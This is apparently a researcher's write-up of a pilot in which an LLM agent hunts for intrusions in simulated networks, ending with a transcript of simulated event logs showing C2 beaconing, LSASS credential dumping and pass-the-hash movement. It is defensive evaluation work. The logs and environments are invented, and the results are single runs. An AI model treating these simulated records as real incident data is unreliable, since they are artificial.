Reversing the Asymmetry: A Small Experiment in AI Threat-Hunting

Can an AI hunt for an intruder on a network instead of waiting for an alarm? What I tried, and what it turned up about where the agent's real limits are.

Itamar Rosen · itamar.rosen1@gmail.com · June 2026

  • Can it tell a real attack from a fake one?
  • Can it resist a competing story?
  • Will it chase the loudest thing, or the real one?
  • What happens when the proof isn't in the feed?
  • Intelligence, or judgment?
    • The accidental tampering test

Can an AI hunt for an intruder inside a network, instead of waiting for an alarm to tell it one is there?

That is the question this started from, and the rest is what I found when I tried to answer it.

The problem

Most tools that look for intruders work by recognizing them. They watch a network, compare what is happening against a long list of behavior already known to be bad, and raise a flag when something matches. Against noisy or careless attacks, that works fine.

But the method has a gap, and anyone serious can see it. They learn what the tools flag, then move only in ways that match nothing on the list. No malware. No known-bad signature. Just ordinary-looking activity that happens to belong to someone who should not be there. The defender has to watch every way in; the attacker needs only the one nobody is watching.

The group known as Salt Typhoon spent more than a year inside several phone networks this way before anyone noticed. There was nothing for the tools to recognize, so they didn't.

There is an older answer that does not depend on recognizing anything. You hunt. Someone who knows the terrain sits with the network, reasons about where an intruder would have to be if one were there, and goes to collect the evidence that would settle it. It is how most serious intrusions have actually been caught: by a person following a thread, not a product raising a flag. The deep ones that did get found, the Equation Group, ProjectSauron, SolarWinds, were caught this way, by someone reasoning toward the evidence rather than an alarm going off.

Hunting also has an edge detection never gets. A detector gets one shot, at the moment of attack. A hunter can come back again and again, to the traces an intruder leaves and cannot erase while still using its access. The attacker owns the device, but not the shape of the network, and cannot scrub the evidence its own activity keeps forcing into places it does not control.

It works. The catch is that it has never scaled. It takes a rare expert, a lot of time, and one network at a time. You cannot point that at everything that matters and keep it running.

What makes the question live now is that the reasoning part may no longer need a person. Language models have gotten good enough to at least attempt the open-ended thinking a hunt requires: working through a real, messy network and judging what is worth chasing. If a model can do that, the hunt can be aimed at everything and run continuously.

The economics tilt the same way. A capable attacker reuses expensive implants and infrastructure across hundreds of targets, so catching that tooling on a single network exposes the method and forces a costly rebuild. You do not have to catch every intrusion. Catch it once, anywhere, and the asymmetry starts to run backward: the defender no longer has to be right everywhere, the attacker does.

So I wanted to find out whether one actually could, and where it would break. I set it up so it could prove me wrong, with one bet in mind: an AI can hunt, and where it fails against a serious adversary, it fails at judgment, not at intelligence.

What this is, and isn't

It is a pilot. Usually one run per case, so the results are existence proofs: the kind that show something can happen, before you measure how often.

Every network serves its evidence from a known ground truth. That is deliberate. It isolates the question I care about, whether the agent can reason its way to the right answer, from the separate problem of collecting evidence on a real network. I come back to that second problem at the end.

With that set, here is how it went.

What I wanted to find out

The bet breaks into five questions. I wrote each one so the experiment could answer it against me.

  • Can it hunt at all? Start from a bare map, with no alarm pointing anywhere, and reason its way to a hidden intrusion, instead of just pattern-matching whatever is in front of it.
  • When the proof has to be fetched, does hunting beat a passive scan? My bet was that the gap only opens once the attacker lives off the land and the deciding evidence has to be gone after, not read off a feed.
  • When it is wrong, is that a reasoning failure or a confidence failure? Does it miss the intrusion, or does it reach the right idea and then state it with the wrong certainty?
  • Can it stay honest under tampered evidence and dead-ends? When the on-device data has been altered, and the one piece of proof that would settle it does not exist, can it say "I can't tell" instead of inventing a verdict?
  • Can a mechanism fix the confidence problem without breaking what already works? Without stripping real findings, or clearing networks it shouldn't.

The rest of this answers them roughly in the order I asked them.

How the experiment works

Every environment here is a simulation. I build a network, write down the full truth of what is happening on it in a file the agent never sees, then turn the agent loose to investigate as if it were real. Nothing is labeled for it. It has to reason its way to whatever is there.

The shape is the same every time. Drop a known intrusion into the network, hand the agent only the map and one instruction, and watch what it concludes and on what evidence. The instruction never changes across the whole project: work out whether this network is compromised, and if so, how.

A few pieces recur, so here they are up front.

  • The topology is the map the agent starts from: a file listing the devices, the links, and the accounts, with nothing marked malicious. At the start, this is all it sees.
  • The ground truth is the hidden answer key: a separate file describing what is really going on, where the intrusion sits, and what evidence would prove it. The agent never sees this. I use it to answer the agent's evidence requests, and to judge the result.
  • The collector, which I also call the monitor, is what the agent queries for evidence. When it asks to see a log or a record, the collector answers from the ground truth, returning a real record or an honest "not covered." It is deterministic and retrieval-only: it cannot invent.
  • The hunter is the investigating agent itself. It reasons from the map to where an intruder would have to be, asks the collector for evidence, decides what to pull next, and commits to a verdict.
  • The passive detector is the comparison point: a single-pass model that reads whatever telemetry arrives and renders a verdict, with no ability to collect. It stands in for a normal, non-hunting tool.
  • The verifier is a separate challenger, added partway through. It earns its place later, so I will explain it when it does.
Under the hood: what's inside an environment

Each environment is a folder. topology.json is the map the agent sees. ground_truth.md is the answer key it does not: the planted intrusion if there is one, the deciding evidence, and the deliberate traps. When the agent requests evidence, the collector resolves the request against the ground truth and hands back the matching record, or an honest "not covered" when the request falls outside what is instrumented. The agent works real-but-simulated data it cannot tell apart from a live feed. Because every record is served from a known truth, the experiment measures reasoning and judgment, not whether this evidence could be gathered on a real network. That last part is its own hard problem, and I come back to it.

The hunter does not follow a script. It works the way an investigator does: a loop of guesses and evidence that tightens until it can commit.

Can it hunt at all?

Before anything subtle, I had to know the agent could do the plain job. So the first network was easy on purpose.

One realistic intrusion, dropped into ordinary traffic: a phished workstation, a backdoor, stolen credentials, a hop to the domain controller, a few files taken on the way out. Nothing pointed the agent at it.

It worked. The agent reasoned its way to the intrusion and rebuilt the whole chain.

But one loud incident on a clean network proves almost nothing. So I kept it as a baseline, and set a rule for everything after: the same intrusion every time, with exactly one new way to mislead the investigator added at each step. If something breaks, I know what broke it.

The first thing to add was the obvious one. Real networks are full of activity that looks like an attack and isn't. Could it tell the difference?

Can it tell a real attack from a fake one?

I rebuilt the same intrusion inside a busier network and surrounded it with eight benign lookalikes. Each was a small trap for something that matches patterns instead of thinking.

A developer tool that beacons out the way malware checks in. A security agent that reads the slice of memory where passwords live, exactly as a credential thief would. A backup job that reads files in bulk and ships them out, which looks like theft if you don't check what it is.

The agent had to find the real intrusion and leave the innocent things alone. It did. It pulled on each thread just far enough to tell real from benign, and reported only the real chain.

That was the first real sign it was reasoning about evidence, not matching shapes.

But a lookalike sitting still is the easy version. The harder problem is a second story that actively competes with the true one for the same evidence.

Can it resist a competing story?

So I gave it one. Two, in fact.

An authorized credential-dumping test on another machine, with real tooling and real memory access, but sanctioned. And a burst of password-guessing at the perimeter, dangling a tidy alternative for how the attacker first got in.

In the logs, either could plausibly belong to the intrusion. The only way to place them is to leave the logs and check the systems that record intent: the change tickets, the identity records, the approvals.

The agent did exactly that. It tied the memory access to the ticket that authorized it and set it aside. It checked the password-guessing against the real login records, saw it had never once succeeded, and refused to let it hijack the story of the real break-in.

It was telling resemblance from relatedness, which is the line between an analyst and a keyword search.

I had now watched it handle noise and competing narratives. But there was a cruder trap I hadn't sprung: the very human instinct that the loudest alarm must be the real threat.

Will it chase the loudest thing, or the real one?

I staged an authorized red-team exercise at a branch office. Loud and complete: the whole attack chain in miniature, plus two unhandled high-severity alerts demanding attention. The real attack, meanwhile, tripped nothing at all.

The loud thing was the decoy. The quiet thing was real.

The agent walked up to the loud one and, instead of reporting it, checked it. It found the change record that authorized the exercise, confirmed the session had only looked and taken nothing, and set it aside. Then it reported the quiet attack that had raised no alarm.

I had also quietly switched off a logging feature on the domain controller, to see whether it would read missing evidence as innocence or as guilt. It read it as neither. Just a gap to work around.

So across four networks, the agent was right every time. But I will be honest about what those wins did and didn't show, because they all rested on one quiet condition.

The evidence that cleared the decoys and the evidence that convicted the attacker was always already there, in the data I handed it. The agent was doing excellent reading. I still hadn't made it hunt.

A real living-off-the-land adversary does not leave the proof in the feed. So I built the network that took it away.

What happens when the proof isn't in the feed?

This is where the project turned.

The next intrusion has nothing for a detector to catch. No malware, no strange destination, nothing on any list.

An old account belonging to an outside auditor, left switched on after the audit ended and exempt from the extra login check everyone else has, signs in from a foreign address. Seventeen minutes later it registers a harmless-sounding add-on called "Mailbox Archiver Pro." Over the next two weeks, that add-on quietly reads the mailboxes of the CEO, the CFO, and the head of mergers, along with the live deal documents.

That is the entire attack. Every piece of it is a legitimate feature used in a legitimate-looking way.

The part that mattered most was where I put the deciding evidence. The proof the add-on was hostile, its permission grant and the record of what it actually read, was in no feed that arrives on its own. It existed only if someone went and asked. And two louder things sat in the way of anyone looking: a noisy burst of password-guessing, and a genuinely authorized penetration test.

The real intrusion was quiet and off to the side. Confirming it meant knowing to ask a question nobody had prompted.

I ran this as three separate investigations of the same network: a passive detector, the active hunter, and a control with the intrusion removed. Side by side, they are the clearest result in the project.

Under the hood: the three arms

The passive detector is the stand-in for a normal non-hunting tool. It reads the telemetry that arrives and renders a verdict, with no ability to collect. The active hunter is free to ask for records and decide what to pull next. The control is the same network with the intrusion removed, there to check whether the hunter was responding to evidence or just inclined to find something.

The passive detector. It saw the add-on register and concluded, confidently, that this was a textbook mailbox-exfiltration pattern. A named, confirmed compromise. It had the right suspect.

But the things it leaned on were guesses, and the decisive evidence it actually cited was none. It had inferred a confirmed breach from the shape of the registration. The right answer, unearned.

The hunter. Handed the same lead, it didn't stop at the shape. It went and pulled the add-on's actual activity, and found it: a log of that add-on reading the live deal site more than fifty times over two weeks.

Then it ran into a gap I had planted. The mailbox logging hadn't been switched on until partway through the attack, so the earliest reads couldn't be seen directly. The agent handled this the way I'd hoped. It flagged the missing logs as a known gap in the logging rollout, said plainly this was not evidence of tampering, and reasoned that collection had probably started earlier, because the deal-site record showed access beginning before the mailbox logging came online. It confirmed the breach on evidence, and was careful about the part it couldn't measure.

The control. This is what makes the rest trustworthy. Same suspicious orphaned account, but with no malicious activity behind it, the agent concluded there was no evidence of an actual compromise and filed the account as a hygiene problem, not a break-in.

It cleared the clean network. So its confirmation in the real one came from what it found, not from a reflex to find someone guilty.

What it means. The shape is clean. When the adversary leaves traces in the feed, passive detection is fine. The moment the adversary lives off the land, it collapses. And it does not collapse quietly. It claims a confirmed compromise it never confirmed.

What stuck with me was how it failed. It didn't go silent or miss the target. It asserted more than its evidence supported and happened to be right. A model that does that when it's right will do the same when it's wrong, and a confident accusation against a clean network, or a confident all-clear over a compromised one, is the failure that costs you something.

The over-claim was a confidence problem wearing the disguise of a correct answer. Which raised the question that reframed everything. When the agent itself goes wrong, is it a limit of intelligence, or of judgment?

Intelligence, or judgment?

For the last stretch I moved to the network's own infrastructure: the routers and switches.

This is the world of Salt Typhoon and Volt Typhoon, where the attacker controls the very device that is supposed to report on itself. It is also where the idea I started with stops being a nicety and becomes the whole game. If the compromised device can lie about itself, the only trustworthy evidence is the evidence you collect from somewhere it does not control.

I built this part as a small grid on one shared network: honest instrumentation versus tampered, crossed with actually-compromised versus actually-clean. In the honest cells, the deciding evidence is an off-device correlation that holds together. In the tampered cells, the device's self-report reads clean because it has been altered, and only an out-of-band tap still shows the truth. The grid asks one question: does the verdict follow the truth of the network, or only the cooperativeness of the evidence?

Under the hood: what out-of-band means

A compromised router can be made to say anything about itself. But the traffic it sends still has to cross the wire, and you can copy that traffic further out, on equipment the attacker has not touched. That copy is the out-of-band tap. The agent never sniffs packets itself; it reads what an independent collector already recorded. The bet of this whole section is that the off-device view is the one ground truth a device-owning adversary cannot rewrite.

Two things had to be fixed before I could trust what this network told me. One of them taught me more than any test I designed.

The first was mundane. An early version of the collector let a language model answer the agent's evidence requests, and under pressure it made things up: clean-looking results that were never real, its own guesses leaking into the data. That fabrication is the whole reason the collector ended up strictly retrieval-only: able to return a real record or an honest "not covered," but never an invention of its own.

The accidental tampering test

The second problem started as a bug. Even after that fix, my own evidence files were flawed. In the clean cells, the denials were naming the very indicators they were supposed to be free of. A few out-of-scope requests came back carrying another device's data.

I had not planted any of it. It was a plumbing mistake on my end.

The agent caught it anyway. It did not take the leaked details and run with them. It flagged the channel itself as inconsistent, called it a manipulated read path, and treated everything it was shown as untrustworthy. It was right that the data was tampered with. It was just tampered with by me, by accident, rather than by an adversary. If anything, it audited me, reading my own evidence pipeline more carefully than I had.

That is the detail I trust most in the entire project, precisely because I did not engineer it. A tampering test I plant only proves the agent does what I built it to do. An inconsistency I did not plant, noticed on its own, is far stronger evidence that the distrust is a real instinct and not a scripted response. It reacts to evidence that does not add up, not to a script of attacks it was told to expect.

And that is the instinct the job needs. The first thing a serious adversary does on a device it owns is make the read path lie.

The flip

Then came the thing that reframed the project.

The same failure kept appearing from two opposite directions. Left cautious, the agent took a clean-looking network at face value. That is the exact false all-clear a patient adversary who tidies up is built to produce. Given an explicit picture of that adversary, it tipped the other way, primed to read every gap as the enemy's hand, on its way to inventing intrusions in networks that were actually clean.

Same model. Opposite errors. Set entirely by how I worded the instructions.

A limit of intelligence does not reverse when you reword the prompt. A limit of judgment does. The question stopped being "can it hunt" and became "can it judge."

That changed what a correct answer even was. When the deciding evidence genuinely does not exist, "I can't clear this, and here is the blind spot" is the right answer, not a failure. So I set three allowed verdicts: confirm, can't-clear, no-finding. Only two outcomes count as real failures: clearing a network that is actually compromised, and accusing one that is clean.

That is the standard. The flip says the agent can hit it or miss it depending only on how I frame the prompt. So the question turned concrete: could a mechanism hold it to the standard, and supply the judgment the wording alone couldn't?

Can judgment be built? The verifier

So I built a second pass whose only job is restraint.

After the agent records a conclusion, a separate challenger looks at it. It starts fresh, with no attachment to the original answer. For each conclusion, it builds the strongest competing explanation for the same evidence, and asks the one question that matters: does this evidence actually tell the two stories apart, or would it fit both equally well?

Under the hood: how the verifier rules

It returns one of three verdicts on each conclusion: supported, non-diagnostic, or contradicted. It flags whether the deciding evidence is even reachable, and hands back a directive the agent has to act on. It works in both directions, challenging a clean verdict with the guilty alternative as hard as it challenges an accusation with the innocent one. It also checks scope: a claim that says more than its evidence can carry, like "data was stolen" when only the volume of traffic was seen, gets rewritten down to what the evidence supports, with the rest moved to open questions. Anything still unresolved when the time budget runs out is forced to an open coverage gap, never to "clean."

In practice the loop simply gains a gate. The collection cycle is the same as before. What is new is that a recorded conclusion now has to get past the challenger before it can reach the report. A non-diagnostic or contradicted verdict pushes the agent back into the loop to collect more, narrow the claim, or drop it.

Then I put it to work on the two cells that mattered: the compromised, tampered network with the deciding tap gone, and the same network with the tap in place. With the tap gone, there is no honest verdict but "I can't tell," and the clean-looking lies dare you to clear it anyway. With the tap there, the breach can be confirmed, and the temptation flips: to claim more than the evidence shows.

When the proof is gone

The first was the case I most wanted to see: the tampered network with the deciding tap removed entirely. The network is compromised. The self-reports are clean lies. The one piece of evidence that would settle it does not exist.

The agent held. It did not clear the network on the strength of the clean-looking self-reports. It did not inflate its suspicion into a finding. It held the question open, named the out-of-band collection that would have settled it, and confirmed that collection was unreachable.

The verifier reinforced the line. It marked the deciding evidence unreachable, refused to let a clean self-report stand as a clearance, and forced the open question to stay open rather than collapse into "clean."

It failed in neither direction: it did not clear a compromised network, and it did not claim more than it could prove. In the one case built to force a wrong answer, it gave the honest one.

When the proof is there

With the tap in place, the agent confirmed the breach correctly, reading the covert tunnel off the independent copy of the traffic rather than believing the router: tens of gigabytes leaving for a command-and-control address.

It was careful about the part it could not see. It bounded its exfiltration claim to the volume of traffic rather than its contents, and filed the question of exactly what had left as an open gap.

So the verifier's catch was a subtler over-reach. The agent had claimed that an inbound login it found had established the tunnel, a clean causal story. The challenger marked that non-diagnostic and told it not to assert the link without the authorization records. The agent went and pulled them, then came back with a narrower claim, that the access was unauthorized, while leaving open whether the same actor built the tunnel. The narrower claim held.

A small thing. But it is the mechanism doing exactly its job in a live run: catching the one step past the evidence, and sending the agent back for more.

What it adds up to

Five questions, answered in order.

It can hunt. Across the first four networks it rebuilt the planted intrusion from the map alone, saw through eight benign lookalikes and two competing stories, and refused a red-team decoy louder than the real attack by checking its authorization rather than trusting it. Right every time. But every win leaned on one condition: the proof was already in the feed.

Active hunting beats a passive scan right at the living-off-the-land line. When the deciding evidence had to be fetched, the passive detector collapsed, and not quietly: it asserted a confirmed compromise with no decisive evidence behind it. The hunter went and collected the proof, and a no-incident control cleared the clean network. The cleanest result in the project.

The dangerous failures were calibration, not capability. Cautious framing produced a false all-clear on a compromised network; aggressive framing invented an intrusion on a clean one. Same model, opposite errors, flipped by wording alone. A capability ceiling does not reverse direction when you reword the prompt; a judgment gap does.

It can say "I can't tell." In the case built to force a false verdict, with the deciding proof absent by construction, it neither cleared the network nor invented a finding. It held the question open and named the collection that would have settled it.

A mechanism can supply the judgment without breaking what works. The verifier pulled an over-reaching causal claim back to what the evidence supported, reinforced honest uncertainty where the proof was gone, and left the genuine breach finding standing. At pilot scale, that is an existence proof that the calibration can be engineered, not a measured rate.

Two things surfaced that I hadn't gone looking for.

The first: over-claiming can hide inside a correct answer, the way the passive detector named the right culprit for the wrong reasons. A confident answer that happens to be right tells you nothing about whether the next one will be.

The second is duller but mattered just as much. A simple "find the incident" scorer marks the most careful runs as failures, because declining to declare looks identical, to that scorer, to missing the target. That is the whole reason I read the transcripts instead of trusting the scores.

The honest version of the headline is short. The model was smart enough. The hard part was teaching it to know when it wasn't.

How far this goes

Two results here I would stand behind. Active hunting beats passive detection precisely at the living-off-the-land line, with a control ruling out a reflex to find something. And at the hard edge, the agent's failures are calibration rather than capability, and a verifier can put the calibration back. Those hold up.

Here is what they do not reach yet.

This is a pilot. Each result is one clean run, an existence proof rather than a rate. Showing that something can happen comes before measuring how often, and that is the stage I am at.

The evidence is served from known ground truth, on purpose, to separate reasoning from collection. So this shows the agent can reason to the right answer. It does not show you could gather that evidence on a live network. That collection problem is real, and it is where the next hard part lives.

The calibration finding lines up with recent independent work. I read that as corroboration: separate efforts arriving at the same place, which is usually a sign the place is real.

The verifier's directives redirect a live investigation, which you can watch in the tap run. The heaviest version of the gate, a whole report rejected and rebuilt, hasn't had to fire yet, because no run over-claimed that badly. And all of this runs on one vendor's models.

Related work

The closest prior work measures how well incident-response agents stay calibrated under adversarial evidence, and lands in the same place: the model identifies the threat, then fails at restraint. Recent benchmarks test LLM agents on investigation and triage as well, mostly on cloud-tenant and endpoint data. The network-infrastructure framing, the tampered-evidence twins, and the no-decisive-evidence case are less-trodden ground. And the verifier's method is not new: it is Analysis of Competing Hypotheses, a long-standing intelligence-analysis discipline, adapted to an agent loop.

What's next

To turn the existence proofs into measured results: run each case many times and report rates rather than examples, deliberately provoke an over-claim bad enough to trip the report-level gate, and score against the three-verdict standard rather than a find-the-incident one.

The larger question is the collection problem I set aside. In a real living-off-the-land world, the trustworthy evidence lives off the compromised device, and getting it there is a matter of infrastructure and instrumentation, not reasoning. That is where both the difficulty and the value sit next.

A note at the end

A disclosure, since the subject invites it. I used AI heavily throughout this, to build the harness, to think through the design, and to write it up. I am not going to draw a clean line between its part and mine, because they are genuinely interwoven, and that is just how the work happened. What I'll say plainly is that I couldn't have reached these results, certainly not this quickly, without it.

That also means there are almost certainly mistakes in here I haven't caught, in the framing or the claims or the reasoning. If you find one, I'd genuinely like to know: itamar.rosen1@gmail.com. The reason I released the whole harness and every transcript is so you can check the work and tell me where I'm wrong.

And a personal note. This went from an idea to a working evaluation, the harness, the environments, the verifier, and this writeup, in about two days. It's a pilot and its limits are all above, so I'm not overselling it. But the thing that used to make careful, adversarial work like this slow was time and scarce expertise, and a lot of that is falling away fast. Mostly I'm just curious what's going to be here in six months.

The environment ladder

Each step adds one new challenge over the same intrusion. What changes is the difficulty of the judgment, not just the case.

Environment The one thing it adds What it tests Resources
env_000 a clean planted incident Can it reconstruct an intrusion at all? ground truth · topology · transcript
env_001 benign lookalikes (decoys) Find the real thing; don't escalate the innocent ones. ground truth · topology · transcript
env_002 competing narratives Tell resemblance from real relatedness. ground truth · topology · transcript
env_003 a louder-than-real authorized red-team + an evidence gap "Louder isn't realer"; don't read absence as guilt. ground truth · topology · transcript
env_004 a quiet, on-demand-evidence LOTL incident Passive detection collapses and over-claims; hunting resolves. ground truth · topology · transcript
env_005 network-infra LOTL, a tampered-evidence twin, the no-tap case, the verifier Reasoning vs. calibration; irreducible uncertainty. ground truth · topology · transcript

Reproducibility

An evaluation is only worth as much as its inspectability. You should be able to read the same transcripts I did and disagree with me. The full harness, all six environments, the verifier, and the complete investigation log for every run live in the repository, MIT-licensed, at github.com/ItamarRosen/hunter.

Each environment's ground truth (ground_truth.md) and topology (topology.json) sit under environments/<name>/ and are linked per row from the Resources column above. Every hunt writes its full artifacts into a timestamped runs/<name>_<timestamp>/ directory: the agent's hypotheses, every evidence request, what the collector returned or an honest "not covered," the final report and scoring, and, when the verifier is on, its log. There's a readable investigation_log.md for each run. The web edition of this writeup embeds one representative run per environment as an appendix, and the transcript links in the ladder above jump straight to it.

Appendix — run transcripts

The raw evidence behind every claim above: one representative run per environment, exactly as the harness wrote it — the agent’s hypotheses, each evidence request, the monitor’s response, the verifier’s verdicts, and the final report. Each transcript link in the ladder jumps here and opens the matching logs. These run long: a transcript’s title stays pinned at the top of the screen while it’s open, so you can click it to collapse from anywhere — there’s also a collapse this button at the end of each one, and a floating collapse open button to close everything at once.

  • env_000 — can it hunt at all?
  • env_001 — noise and decoys
  • env_002 — competing narratives
  • env_003 — the louder lie
  • env_004 — taking the evidence off the feed
  • env_005 — the hardest version

env_000 — can it hunt at all?

Hunter — investigation log

Investigation log — env_000_dummy

Briefing

Network topology: { "name": "env_000_dummy", "description": "Small corporate office network: a perimeter firewall in front of a flat internal LAN containing a domain controller, two workstations, and a file server.", "current_date": "2026-06-12", "segments": [ { "id": "perimeter", "description": "Internet-facing edge." }, { "id": "corp-lan", "description": "Internal corporate LAN \u2014 workstations, domain controller, and file server. Address range 10.10.0.0/16." } ], "devices": [ { "id": "fw01", "hostname": "EDGE-FW01", "role": "perimeter firewall", "os": "vendor appliance (firewall/router)", "ip": "203.0.113.1", "segment": "perimeter", "notes": "Internet-facing edge device. NATs internal traffic out; no inbound rules besides a site-to-site VPN to a branch office." }, { "id": "dc01", "hostname": "CORP-DC01", "role": "domain controller", "os": "Windows Server 2022", "ip": "10.10.0.10", "segment": "corp-lan", "notes": "Primary Active Directory domain controller for corp.local. Also runs DNS for the internal network." }, { "id": "ws01", "hostname": "FIN-ALICE", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.21", "segment": "corp-lan", "notes": "Primary workstation for Alice Chen, Finance analyst." }, { "id": "ws02", "hostname": "IT-BOB", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.35", "segment": "corp-lan", "notes": "Primary workstation for Bob Nguyen, IT administrator. Bob holds domain admin rights and regularly remotes into servers and other workstations for support." }, { "id": "fs01", "hostname": "CORP-FS01", "role": "file server", "os": "Windows Server 2019", "ip": "10.10.0.20", "segment": "corp-lan", "notes": "Hosts SMB shares for the Finance and IT departments, including a Finance\Confidential share." } ] }

You have up to 15 collect_evidence calls for this investigation. Begin.

Step 1

Initial Assessment

This is a small corporate network with high-value targets: a domain controller (dc01), a file server with confidential finance shares (fs01), an IT admin workstation with domain admin rights (ws02), and a finance workstation (ws01).

Key hypotheses to test: 1. Initial access via the perimeter — firewall logs for unusual inbound connections 2. Credential compromise on ws02 (Bob's domain admin account) — high-value lateral movement target 3. Unauthorized access to Finance\Confidential share on fs01 — data exfiltration risk 4. DC01 compromise — pass-the-hash, DCSync, or Golden Ticket activity 5. Workstation compromise via phishing — ws01 (Alice, Finance) is a classic phishing target

Let me start broad across the highest-value targets simultaneously.

→ collect_evidence(fw01)

Show me the firewall connection logs for the past 30 days. Specifically: any inbound connections that were permitted (not blocked) from external IPs, any unexpected outbound connections on non-standard ports, and any traffic volume anomalies. Include source IP, destination IP, destination port, protocol, and byte counts where available.

→ collect_evidence(dc01)

Show me Windows Security event log entries from the past 14 days for: (1) Event ID 4624 logon type 10 (RemoteInteractive) and type 3 (Network) — include source IP, account name, and timestamp; (2) Event ID 4768/4769 (Kerberos TGT/service ticket requests) for privileged accounts; (3) Event ID 4672 (Special privileges assigned to new logon) — who received them and from where.

→ collect_evidence(fs01)

Show me Windows Security event log entries from the past 14 days for: (1) Event ID 5140/5145 (network share access) — specifically any access to Finance\Confidential share, including account name, source IP, and access type; (2) Any accounts that accessed shares outside of normal business hours (before 07:00 or after 19:00 local time); (3) Event ID 4624 logon events — include source IPs and account names.

← result — found: True

🎯 embeds ground truth: c2_ip, backdoor_ws01, exfil_fs01, persistence_scheduled_task

Event log retention on CORP-FS01: 128 MB rolling; full coverage confirmed for query window.
Log source: Microsoft-Windows-Security-Auditing (Security channel)
Note: EID 5145 object-level auditing enabled on Finance\Confidential share only; other shares log EID 5140 (share-level) only.

Step 2

This is highly significant. The firewall data reveals a clear C2 beacon pattern and exfiltration. Let me summarize what I've found so far and drill deeper:

Key findings emerging: 1. FIN-ALICE (ws01) beaconing to 185.220.101.47 starting 2026-06-08 ~14:32 UTC — textbook ~5-minute interval C2 beacon 2. CORP-DC01 exfiltrating 38.7MB to the same IP on 2026-06-09 03:08 — followed by daily ~1.4MB scheduled task callbacks 3. bnguyen RDP'd into DC01 from FIN-ALICE at 02:31 on 2026-06-09 using NTLM (not Kerberos) — anomalous 4. bnguyen's credentials used from DC01 to access Finance\Confidential at 02:55 on 2026-06-09

I need to investigate ws01 (Alice's machine — the likely initial compromise point), DC01's scheduled tasks and process activity, and ws02 to understand if Bob's account was stolen from there.

→ collect_evidence(ws01)

Show me: (1) Windows Security event log entries for the past 14 days — specifically EID 4624/4625 logon events, EID 4688 process creation events, and EID 4698/4702 scheduled task creation/modification; (2) PowerShell operational log entries (EID 4103/4104) from 2026-06-08 through 2026-06-09; (3) Any browser download history or recently executed files around 2026-06-07 to 2026-06-09; (4) Autoruns / persistence mechanisms: scheduled tasks, registry run keys, and startup folder contents currently present on this system.

→ collect_evidence(dc01)

Show me: (1) All scheduled tasks currently registered on CORP-DC01, including task name, action (executable/script), trigger, run-as account, and creation/modification date — especially any created or modified after 2026-06-08; (2) Windows System and Security event log entries for EID 4698/4702 (scheduled task created/modified) in the past 14 days; (3) Any processes running as 'svc_backup' or from unusual paths (e.g., ProgramData, AppData, Temp, Users) visible in current running process list or recent EID 4688 process creation events from 2026-06-08 to 2026-06-12; (4) DNS query logs for outbound queries to 185.220.101.47 or any unusual external hostnames resolved by the DC in the past 7 days.

← result — found: True

🎯 embeds ground truth: phishing_email, backdoor_ws01, credential_theft, c2_ip

FIN-ALICE (ws01) — Security Event Log / PowerShell Log / Artifact Export
Query window: 2026-05-29 00:00:00 to 2026-06-12 23:59:59 (logs); focused subsets as noted
Generated: 2026-06-12 14:55:11

Step 3

The picture is now crystal clear. The attack chain is fully documented. Let me do two final targeted checks to confirm the lsass dump yielded bnguyen's credentials from ws01, and to assess what data actually left the network post-compromise.

→ collect_evidence(ws02)

Show me: (1) Windows Security event log entries for EID 4624/4625 logon events on 2026-06-08 and 2026-06-09, especially any unusual source IPs or off-hours logons; (2) EID 4688 process creation events from 2026-06-08 through 2026-06-09 — looking for credential dumping tools, PowerShell with encoded commands, or network reconnaissance tools; (3) Current registry Run keys and scheduled tasks for any persistence mechanisms not expected on a standard IT admin workstation; (4) Check whether bnguyen's session was active on this machine during 02:00-03:00 on 2026-06-09, specifically any RDP sessions OUT to FIN-ALICE or CORP-DC01.

→ collect_evidence(dc01)

Show me Active Directory change log events from 2026-06-09 00:00 to 2026-06-09 06:00: specifically EID 4720 (account created), EID 4728/4732/4756 (user added to security group), EID 4723/4724 (password change/reset), and EID 4662/4929 (AD object access/replication). Also show EID 4776 (NTLM credential validation) for the same window — was bnguyen's credential validated via NTLM, and from what source IP? This will confirm whether the attacker used a harvested NTLM hash or cleartext credential.

← result — found: True

========================================================
SECTION 5: EID 4776 — NTLM CREDENTIAL VALIDATION
========================================================
Filter: all EID 4776 events on DC (CORP-DC01 is NTLM validation authority for the domain).

Timestamp (Local)         EventID  Account Validated   Workstation         Error Code    Notes
------------------------  -------  ------------------  ------------------  ------------  -----
2026-06-09 02:31:38       4776     bnguyen             FIN-ALICE           0x0           ** Success; source workstation = FIN-ALICE (10.10.10.21) **
2026-06-09 02:55:06       4776     bnguyen             CORP-DC01           0x0           Success; loopback NTLM from DC itself (SMB net use to fs01)
2026-06-09 03:08:41       4776     bnguyen             CORP-DC01           0x0           Success; loopback NTLM — upload connection

--- All other EID 4776 events in window (00:00–06:00) ---

Timestamp (Local)         EventID  Account Validated   Workstation         Error Code    Notes
------------------------  -------  ------------------  ------------------  ------------  -----
2026-06-09 01:04:18       4776     svc_backupjob       CORP-FS01           0x0           Nightly backup service — expected
2026-06-09 01:44:52       4776     svc_backupjob       CORP-FS01           0x0           Backup job completion re-auth — expected

[NO OTHER NTLM VALIDATION EVENTS between 00:00 and 06:00 on 2026-06-09]

--- Analyst note on EID 4776 authentication type ---

The 02:31:38 validation for bnguyen originating from FIN-ALICE (workstation name transmitted in
NTLM Type-1 negotiate message) used NTLM rather than Kerberos. Cross-referencing:

  - EID 4624 on dc01 at 02:31:44 shows LogonType=10, AuthPackage=NTLM, SourceIP=10.10.10.21
  - EID 4776 at 02:31:38 shows workstation claim = "FIN-ALICE"
  - Kerberos TGT request (EID 4768) was also observed at 02:31:41 from 10.10.10.21 (CORP-DC01 issued ticket)

Interpretation: The session initiated with an NTLM credential validation (consistent with
pass-the-hash OR plaintext credential use — EID 4776 alone cannot distinguish between these
two; both produce a successful 0x0 result). The subsequent Kerberos TGT issuance (4768 at
02:31:41) indicates the attacker obtained a full Kerberos ticket after initial NTLM auth,
providing broader lateral movement capability.

To distinguish pass-the-hash from cleartext: NetLogon debug logging or a contemporaneous
network capture (PCAP) of the NTLM exchange would be required. Given that the credential
material was harvested via LSASS minidump on ws01 at ~02:14 (which captures both NT hashes
and any cached Kerberos tickets), either vector is consistent with the evidence.

========================================================
SECTION 6: SUMMARY OF ANOMALOUS EVENTS IN WINDOW
========================================================

02:31:38  EID 4776  — NTLM validation: bnguyen from FIN-ALICE           [ANOMALOUS — unexpected source]
02:31:41  EID 4768  — Kerberos TGT issued: bnguyen, client 10.10.10.21  [ANOMALOUS — unexpected source]
